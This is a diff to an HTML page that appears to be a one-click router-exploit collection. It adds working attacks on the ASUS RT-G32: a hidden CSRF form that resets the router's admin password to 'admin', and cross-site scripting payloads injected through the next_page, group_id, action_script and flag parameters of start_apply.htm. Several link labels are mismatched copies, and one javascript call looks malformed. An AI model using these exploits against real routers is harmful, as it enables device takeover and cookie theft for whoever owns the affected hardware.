@@ -123,6 +123,60 @@
          </tr>
         </tfoot>
         <tbody>
+<tr>
+<form name="rt632csrf" action="http://site/start_apply.htm" method="post">
+<input type="hidden" name="http_passwd" value="admin">
+<input type="hidden" name="http_passwd2" value="admin">
+<input type="hidden" name="v_password2" value="admin">
+<input type="hidden" name="action_mode" value="+Apply+">
+</form>
+    <td>2015/02/28</td>
+    <td>One click</td>
+    <td><a href="http://websecurity.com.ua/7644/">websecurity</a></td>
+    <td><a href="javascript:rt632csrfxip)" onclick="return ip=prompt('IP:');">ASUS RT-G32 CSRF Add admin:admin account</a></td>
+    <td>MustLive</td>
+</tr>
+<tr>
+<form name="rt632xssf" action="http://site/start_apply.htm" method="post">
+<input type="hidden" name="next_page" value="'+alert(document.cookie)+'">
+<input type="hidden" name="group_id" value="'+alert(document.cookie)+'">
+<input type="hidden" name="action_script" value="'+alert(document.cookie)+'">
+<input type="hidden" name="flag" value="'+alert(document.cookie)+'">
+</form>
+    <td>2015/02/28</td>
+    <td>One click</td>
+    <td><a href="http://websecurity.com.ua/7644/">websecurity</a></td>
+    <td><a href="javascript:rtg32xss(ip)" onclick="return ip=prompt('IP:');">ASUS RT-G32 POST Cross Site Scripting</a></td>
+    <td>MustLive</td>
+</tr>
+<tr>
+    <td>2015/02/28</td>
+    <td>One click</td>
+    <td><a href="http://websecurity.com.ua/7644/">websecurity</a></td>
+    <td><a href="javascript:setip('/start_apply.htm?next_page='+xss)" onclick="return xss=getxss();">ASUS RT-G32 next_page Cross Site Scripting</a></td>
+    <td>MustLive</td>
+</tr>
+<tr>
+    <td>2015/02/28</td>
+    <td>One click</td>
+    <td><a href="http://websecurity.com.ua/7644/">websecurity</a></td>
+    <td><a href="javascript:setip('/start_apply.htm?group_id='+xss)" onclick="return xss=getxss();">ASUS RT-G32 next_page Cross Site Scripting</a></td>
+    <td>MustLive</td>
+</tr>
+<tr>
+    <td>2015/02/28</td>
+    <td>One click</td>
+    <td><a href="http://websecurity.com.ua/7644/">websecurity</a></td>
+    <td><a href="javascript:setip('/start_apply.htm?action_script='+xss)" onclick="return xss=getxss();">ASUS RT-G32 next_page Cross Site Scripting</a></td>
+    <td>MustLive</td>
+</tr>
+<tr>
+    <td>2015/02/28</td>
+    <td>One click</td>
+    <td><a href="http://websecurity.com.ua/7644/">websecurity</a></td>
+    <td><a href="javascript:setip('/start_apply.htm?flag='+xss)" onclick="return xss=getxss();">ASUS RT-G32 next_page Cross Site Scripting</a></td>
+    <td>MustLive</td>
+</tr>
          <form action="http://192.168.1.1/start_apply.htm" id="N56U" method="post" name="N56U">
           <input name="http_username" type="hidden" value="admin"/>
           <!-- Admin Username -->
@@ -197,5 +251,6 @@ pageTracker._trackPageview();
     </tr>
    </tbody>
   </table>
+  <img name="img1" id="img1" style="display:none">
  <script src="http://www.routerpwn.com/includes/scripts.js"></script></body>
 </html>
